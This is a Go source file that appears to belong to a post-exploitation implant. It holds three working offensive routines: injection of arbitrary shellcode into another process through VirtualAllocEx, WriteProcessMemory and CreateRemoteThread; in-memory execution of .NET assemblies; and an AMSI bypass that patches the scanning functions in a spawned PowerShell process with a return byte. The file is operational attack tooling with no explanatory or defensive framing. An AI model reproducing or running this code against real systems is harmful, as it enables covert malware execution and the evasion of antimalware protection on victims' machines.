package commands

import (
	"fmt"
	"runtime"
	"syscall"
	"unsafe"

	"golang.org/x/sys/windows"

	k32 "Winton/cmd/winapi"
)

func Inject(pid int, shellcode []byte) (string, error) {
	fmt.Println("[*] Injecting into PID:", pid)
	fmt.Println("[*] Shellcode length:", len(shellcode))
	process_handle, err := windows.OpenProcess(windows.PROCESS_CREATE_THREAD|windows.PROCESS_QUERY_INFORMATION|windows.PROCESS_VM_OPERATION|windows.PROCESS_VM_WRITE|windows.PROCESS_VM_READ, false, uint32(pid))
	if err != nil {
		return "", err
	}
	fmt.Println("[*] Opening handle to process...", process_handle)
	defer windows.CloseHandle(process_handle)

	addr, _, err := k32.VirtualAllocEx.Call(uintptr(process_handle), 0, uintptr(len(shellcode)), windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_EXECUTE_READWRITE)
	if addr == 0 {
		return "", err
	}

	fmt.Println("[*] Allocating memory...")

	a, _, err := k32.WriteProcessMemory.Call(uintptr(process_handle), addr, (uintptr)(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)))
	if a == 0 {
		return "", err
	}

	fmt.Println("[*] Writing shellcode to memory...")

	thread_handle, _, err := k32.CreateRemoteThread.Call(uintptr(process_handle), 0, 0, addr, 0, 0, 0)
	fmt.Println("[*] Executing shellcode...")
	if thread_handle == 0 {
		fmt.Println("[*] Error:", err)
		return "", err
	}

	k32.CloseHandle.Call(uintptr(thread_handle))
	k32.CloseHandle.Call(uintptr(process_handle))

	return "OK", nil
}

func Execute_Assembly(asm []byte, params []string) (string, error) {
	runtime.KeepAlive(asm)
	fmt.Println("[*] Executing assembly with params: ", params)
	fmt.Println("[*] Assembly length:", len(asm))

	fmt.Println("[*] Patching AMSI...")
	PatchAmsi()
	fmt.Println("[*] AMSI patched.")
	runtime := ""
	err := k32.ExecuteByteArray(runtime, asm, params)
	if err != nil {
		return "", err
	}
	fmt.Println("[*] Assembly executed successfully.")
	return "executed, but no output", nil
}

// https://github.com/timwhitez/Doge-AMSI-patch/blob/main/amsi.go
func PatchAmsi() {
	var (
		fntdll             = syscall.NewLazyDLL("amsi.dll")
		AmsiScanBuffer     = fntdll.NewProc("AmsiScanBuffer")
		AmsiScanString     = fntdll.NewProc("AmsiScanString")
		AmsiInitialize     = fntdll.NewProc("AmsiInitialize")
		k32                = syscall.NewLazyDLL("kernel32.dll")
		WriteProcessMemory = k32.NewProc("WriteProcessMemory")
	)
	si := new(syscall.StartupInfo)
	pi := new(syscall.ProcessInformation)
	si.Cb = uint32(unsafe.Sizeof(si))
	err2 := syscall.CreateProcess(nil, syscall.StringToUTF16Ptr("powershell -NoExit"), nil, nil, false, windows.CREATE_NEW_CONSOLE, nil, nil, si, pi)
	if err2 != nil {
		panic(err2)
	}

	hProcess := uintptr(pi.Process)
	hThread := uintptr(pi.Thread)

	var oldProtect uint32
	var old uint32
	patch := []byte{0xc3}

	windows.SleepEx(500, false)

	fmt.Println("patching amsi ......")

	amsi := []uintptr{
		AmsiInitialize.Addr(),
		AmsiScanBuffer.Addr(),
		AmsiScanString.Addr(),
	}

	var e error
	var r1 uintptr

	for _, baseAddr := range amsi {
		e = windows.VirtualProtectEx(windows.Handle(hProcess), baseAddr, 1, syscall.PAGE_READWRITE, &oldProtect)
		if e != nil {
			fmt.Println("virtualprotect error")
			fmt.Println(e)
			return
		}
		r1, _, e = WriteProcessMemory.Call(hProcess, baseAddr, uintptr(unsafe.Pointer(&patch[0])), uintptr(len(patch)), 0)
		if r1 == 0 {
			fmt.Println("WriteProcessMemory error")
			fmt.Println(e)
			return
		}
		e = windows.VirtualProtectEx(windows.Handle(hProcess), baseAddr, 1, oldProtect, &old)
		if e != nil {
			fmt.Println("virtualprotect error")
			fmt.Println(e)
			return
		}
	}

	fmt.Println("amsi patched!!\n")

	windows.CloseHandle(windows.Handle(hProcess))
	windows.CloseHandle(windows.Handle(hThread))
}
